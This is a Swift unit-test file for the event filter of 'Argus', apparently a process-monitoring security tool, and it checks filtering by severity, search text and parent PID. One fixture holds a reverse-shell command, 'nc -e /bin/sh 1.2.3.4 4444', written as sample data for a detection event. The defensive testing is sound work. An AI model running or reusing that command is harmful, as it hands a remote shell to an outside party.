import XCTest
@testable import Argus

final class EventFilterTests: XCTestCase {
    private func event(pid: Int32, ppid: Int32, executable: String, severity: Severity, technique: String, command: String? = nil) -> ProcessEvent {
        ProcessEvent(
            pid: pid, ppid: ppid, executable: executable,
            command: command ?? "\(executable) some args",
            rules: [MatchedRule(name: "rule-\(technique)", severity: severity, technique: technique, explanation: "e")],
            timestamp: Date()
        )
    }

    func testSeverityFilter() {
        let events = [
            event(pid: 1, ppid: 10, executable: "curl", severity: .watch, technique: "T1"),
            event(pid: 2, ppid: 10, executable: "nc", severity: .critical, technique: "T2"),
        ]
        let filtered = EventFilter.apply(events, searchText: "", severities: [.critical], sessionPPID: nil)
        XCTAssertEqual(filtered.map(\.pid), [2])
    }

    func testSearchMatchesExecutable() {
        let events = [
            event(pid: 1, ppid: 10, executable: "osascript", severity: .critical, technique: "T1"),
            event(pid: 2, ppid: 10, executable: "curl", severity: .critical, technique: "T2"),
        ]
        let filtered = EventFilter.apply(events, searchText: "OSA", severities: Set(Severity.allCases), sessionPPID: nil)
        XCTAssertEqual(filtered.map(\.pid), [1])
    }

    func testSearchMatchesCommandAndTechnique() {
        let events = [
            event(pid: 1, ppid: 10, executable: "nc", severity: .critical, technique: "T1059 – Reverse Shell", command: "nc -e /bin/sh 1.2.3.4 4444"),
            event(pid: 2, ppid: 10, executable: "curl", severity: .critical, technique: "T1071 – Non-Standard C2 Endpoint"),
        ]
        XCTAssertEqual(EventFilter.apply(events, searchText: "reverse shell", severities: Set(Severity.allCases), sessionPPID: nil).map(\.pid), [1])
        XCTAssertEqual(EventFilter.apply(events, searchText: "1.2.3.4", severities: Set(Severity.allCases), sessionPPID: nil).map(\.pid), [1])
    }

    func testSessionFocusFiltersByParentPID() {
        let events = [
            event(pid: 1, ppid: 100, executable: "curl", severity: .critical, technique: "T1"),
            event(pid: 2, ppid: 100, executable: "bash", severity: .critical, technique: "T2"),
            event(pid: 3, ppid: 200, executable: "nc", severity: .critical, technique: "T3"),
        ]
        let filtered = EventFilter.apply(events, searchText: "", severities: Set(Severity.allCases), sessionPPID: 100)
        XCTAssertEqual(Set(filtered.map(\.pid)), [1, 2])
    }

    func testFiltersCombine() {
        let events = [
            event(pid: 1, ppid: 100, executable: "curl", severity: .watch, technique: "T1"),
            event(pid: 2, ppid: 100, executable: "curl", severity: .critical, technique: "T2"),
            event(pid: 3, ppid: 200, executable: "curl", severity: .critical, technique: "T3"),
        ]
        let filtered = EventFilter.apply(events, searchText: "curl", severities: [.critical], sessionPPID: 100)
        XCTAssertEqual(filtered.map(\.pid), [2])
    }
}
